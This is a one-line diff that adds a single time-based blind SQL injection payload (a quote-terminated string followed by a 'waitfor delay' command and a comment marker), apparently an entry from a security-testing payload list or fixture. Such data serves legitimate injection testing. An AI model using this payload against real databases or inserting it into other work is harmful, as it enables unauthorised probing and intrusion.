@@ -1,0 +1,1 @@
+JLDEDADQ'; waitfor delay '0:0:6' -- 
